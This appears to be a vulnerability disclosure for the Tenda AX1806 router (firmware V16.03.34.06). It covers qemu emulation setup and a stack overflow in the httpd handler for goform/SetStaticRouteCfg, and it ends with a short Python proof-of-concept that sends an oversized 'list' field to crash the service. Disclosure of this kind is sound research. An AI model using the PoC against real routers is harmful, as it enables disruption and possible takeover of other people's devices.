### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站：[https://www.tenda.com.cn/material/show/103518](https://www.tenda.com.cn/material/show/103518)

### Affected version

**V16.03.34.06**

### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

qemu start command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

### Vulnerability details

tdhttpd in directory /bin has stack overflow vulnerability. The vulnerability occurrs in the function, which can be accessed via the URL .`fromSetRouteStatic goform/SetStaticRouteCfg`

![](api/attachments/IoLy6CdpzI9r/image/image.png)

Stack overflow point：

![](api/attachments/xpoWV2Y2vGZL/image/image.png)

### PoC

```text-plain
import requests

data = {
    b"list": b'A'*0x400+b',A,A,A'
}
res = requests.post("http://ip/goform/SetStaticRouteCfg", data=data)
print(res.content)
```

![](api/attachments/EEwOxMTQCYCi/image/image.png)